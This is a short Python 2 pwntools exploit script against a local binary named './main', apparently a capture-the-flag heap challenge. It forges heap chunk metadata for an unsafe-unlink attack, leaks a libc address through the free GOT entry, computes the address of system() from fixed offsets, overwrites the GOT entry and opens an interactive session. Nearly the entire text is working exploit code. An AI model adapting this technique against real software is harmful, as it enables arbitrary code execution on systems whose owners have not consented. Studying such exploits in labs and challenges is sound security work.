from pwn import *
p = process("./main")
# gdb.attach(p)
heap_addr = 0x804a060
free_got_addr = 0x804a014  # 0x804a010
sys_addr = 0xaaaaaaa

print p.recv()

payload = p32(0x00000000) + p32(0x00000101) + p32(heap_addr - 0xc) + p32(heap_addr - 0x8)
payload = payload + 'a'* (0x100- 16)
payload = payload + p32(0x00000100) + p32(0x00000108)
p.send(payload + "\n")

payload2 = "a"* 12 + p32(free_got_addr)

p.send(payload2 + '\n')
malloc_addr = (u32(p.recv()[0:4]))
base_addr = malloc_addr - 0x5fca0
sys_addr = base_addr + 0x3ada0
print hex(sys_addr)
payload3 = p32(sys_addr)
p.send(payload3 + '\n')
#free_got_addr_x = p.recv()[12:16]
#print hex(int(free_got_addr_x, 16))
'''
leak_got_addr = p.recv()[:-1]
got_addr = int(leak_got_addr , 16)-8
base_addr = free_addr - 0x00077390
sys_addr = base_addr + 0x0003E770
print hex(sys_addr)
payload3 = p32(sys_addr)
p.send(payload3 + '\n')
'''
p.interactive()
